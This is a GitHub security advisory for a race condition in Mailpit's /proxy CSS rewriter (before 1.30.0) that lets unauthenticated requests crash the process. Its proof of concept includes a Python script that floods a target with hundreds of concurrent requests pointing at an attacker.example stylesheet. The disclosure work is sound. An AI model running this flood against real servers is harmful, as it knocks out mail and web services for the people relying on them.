# [M] Mailpit: Concurrent map read & write in proxy CSS rewriter - remote unauth crash (fatal error: concurrent map read and map write)

## Summary
Severity: Medium
Advisory: GHSA-w4vj-r5pg-3722
CVE: CVE-2026-45712
CWE: CWE-362, CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-w4vj-r5pg-3722
Type: github-advisory

## Affected
- Go: `github.com/axllent/mailpit` — affected >=0 <1.30.0

## Details
### Summary
The screenshot/print proxy (/proxy?data=…) maintains a package-level assets map[string]MessageAssets cache, but reads the map without holding assetsMutex while a long-running cleanup goroutine and (re-entrant) CSS-rewriting code path concurrently write to it under the lock. When the unsynchronized read coincides with a synchronized write, Go's runtime raises fatal error: concurrent map read and map write — a runtime.throw that is not recoverable by http.Server's handler-panic recover. The whole Mailpit process exits, taking the SMTP, POP3 and HTTP listeners down with it.

### Details
A remote, unauthenticated attacker who can (1) reach /proxy and (2) plant any message with a stylesheet link in the inbox can crash Mailpit by issuing concurrent /proxy?data=… requests against the same message's CSS URL. Mailpit's defaults make both prerequisites trivial: the SMTP listener accepts mail anonymously, the HTTP listener accepts requests anonymously, and the cleanup goroutine fires every minute regardless of whether the map is being read.

Affected code
[server/handlers/proxy.go:198-229](https://github.com/axllent/mailpit/blob/develop/server/handlers/proxy.go#L198-L229)
[server/handlers/proxy.go:52-66](https://github.com/axllent/mailpit/blob/develop/server/handlers/proxy.go#L52-L66)
[server/handlers/proxy.go:244-313](https://github.com/axllent/mailpit/blob/develop/server/handlers/proxy.go#L244-L313) 

Go's map runtime sets a hashWriting flag at the start of any write op. Concurrent map reads check the flag and call throw("concurrent map read and map write") — throw is not caught by defer recover and is not caught by http.Server's handler-panic guard. The process exits with a stack trace.

### PoC
1. Deposit any message with a <link rel="stylesheet" href="https://attacker.example/big.css"> in the store (SMTP or /api/v1/send, both unauthenticated by default).
2. Make a few hundred concurrent requests to /proxy?data=base64(<id>:https://attacker.example/big.css) — the attacker's big.css should be ~50 MiB and contain thousands of url(...) entries so each request spends time iterating the rewriter loop and touching assets[id] repeatedly.

Skeleton (set --allow-internal-http-requests only if you're testing locally — internal IPs are blocked by safeDialContext in production, which is correct):

```
# proxy-race.py
import socket, threading, base64, sys

ID = sys.argv[1]                                   # 22-char shortuuid
CSS = "https://attacker.example/big.css"
TOKEN = base64.b64encode(f"{ID}:{CSS}".encode()).decode()

req = (
    f"GET /proxy?data={TOKEN} HTTP/1.1\r\n"
    f"Host: target:8025\r\n"
    f"Connection: close\r\n\r\n"
).encode()

def hit():
    try:
        s = socket.create_connection(("target", 8025), timeout=10)
        s.sendall(req)
        while s.recv(8192): pass
        s.close()
    except Exception: pass

for _ in range(50):                                # 50 rounds
    ts = [threading.Thread(target=hit) for _ in range(300)]
    for t in ts: t.start()
    for t in ts: t.join()
```

When the unlocked read at line 216 happens during a delete() from the cleanup goroutine, or during another goroutine's assets[id] = result write, Go's runtime emits:

```
fatal error: concurrent map read and map write

goroutine 123 [running]:
runtime.throw(...)
github.com/axllent/mailpit/server/handlers.ProxyHandler(...)
        server/handlers/proxy.go:216
...
```

…and the process exits. Building Mailpit with go build -race produces a deterministic WARNING: DATA RACE trace at the same line under the same workload, confirming the access pattern is racy even without timing-based crash demonstration.

### Impact
Unauthenticated remote attacker can trigger a concurrent map access crash in /proxy, causing a fatal runtime panic and full Mailpit process termination (DoS).

## References
- https://github.com/axllent/mailpit/security/advisories/GHSA-w4vj-r5pg-3722
- https://github.com/axllent/mailpit
- https://github.com/axllent/mailpit/releases/tag/v1.30.0
